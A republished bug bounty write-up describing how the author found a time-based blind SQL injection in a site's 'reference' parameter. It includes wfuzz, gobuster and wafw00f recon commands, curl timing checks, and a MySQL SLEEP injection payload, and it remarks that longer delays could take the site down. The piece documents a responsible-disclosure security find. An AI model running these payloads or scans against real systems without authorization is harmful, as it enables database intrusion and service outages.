# :game_die: Medium

> **Original Source:** [Medium](https://infosecwriteups.com/the-critical-1000-bug-blind-sql-injection-f85d5db861ba)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

>

N**ote**: This was on a private Bug Bounty Program, so I can’t reveal the actual program name. Let’s just call it EXAMPLE.COM.


*Alright — let’s dive in !*


## **Initial Discovery**


*I stumbled on the bug while casually browsing the site — one of those tiny inconsistencies that smell like something worth following. I didn’t exploit anything further; I reproduced the behavior safely, documented it, and filed a responsible report. That’s how a real hunt starts: quiet observation, careful testing, and doing the right thing.*

## Recon & initial checks


*As usual, I started with some recon to enumerate subdomains, directories and to check for a WAF.*


**Subdomain discovery**:


```
URL="https://example.com/"
wfuzz -H 'Host: FUZZ.example.com' \
--hc 404,403 \
-H 'User-Agent: PENTEST' \
-c \
-z file,/path/to/wordlist.txt \
-t 50 \
$URL
```


**Directory brute-forcing (Gobuster):**


```
gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt -o gobuster_dirs.txt
```


**WAF detection (wafw00f):**


```
wafw00f https://example.com
```


>

*In my case *`*wafw00f*`* returned no WAF detected — a good sign for further low-noise testing.*


**Manual exploration with Burp Suite:**


*While running those checks I also browsed the site manually through Burp Suite (Proxy → open the site in the browser). I inspected requests/responses and used Repeater for quick experiments.*


During manual navigation I noticed a suspicious endpoint:


```
https://example.com/logo.php?reference=***
```


*That parameter (*`*reference*`*) immediately looked interesting — it could be abused for things like LFI, reflected XSS, or SQL injection. So I focused on that.*


*So I sent that to Repeater.*

## Moving from curiosity to a safe time-based test


*Because the application didn’t return SQL errors, I tested for time-based blind SQLi (minimal, non-destructive). Always keep sleeps short (1–3s) and only test in-scope targets.*


## Get Helmiriahi’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


**Measure baseline response time with curl:**


```
curl -s -o /dev/null -w "%{time_total}\n" "https://example.com/logo.php?reference=123"
```


**Test payload (MySQL example — safe / short sleep):**


```
reference=123' OR IF(1=1,SLEEP(2),0) -- -
```


**Send and measure:**


```
payload="123'%20OR%20IF(1=1,SLEEP(2),0)%20--%20-"
curl -s -o /dev/null -w "%{time_total}\n" "https://example.com/logo.php?reference=${payload}"
```


*So I tried this in a different browser because sometimes the server treats requests differently based on sessions.*


*So here is the response — the request’s response time matches the delay I included in the payload.*


*After sending that payload, the server responded with a 504 Gateway Timeout.*


*This happens because the SQL injection payload I used contained the function *`*SLEEP(2)*`*. When executed on the backend database, it forces the server to pause for a specified number of seconds before returning a response. If the delay stacks up or the server is sensitive to execution time, the web application can hit its timeout threshold.*


*In this case, the application was likely behind NGINX, which enforces a timeout limit. Since the database query was artificially slowed down by the injected payload, NGINX killed the request and displayed the 504 Gateway Timeout error.*


*That makes sense. Now…*


*Extending the time range in the SQL database will temporarily break its connection with the server, causing the site to be unavailable for a certain period.”*

>

In the end, the company recognized it as a critical vulnerability, and I received the bounty reward.


Thanks for following along!


**Contact :**


[helmi riahi | LinkedIn](https://www.linkedin.com/in/helmi-riahi-9b3751243/)

---

*Originally published on [Medium](https://infosecwriteups.com/the-critical-1000-bug-blind-sql-injection-f85d5db861ba). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
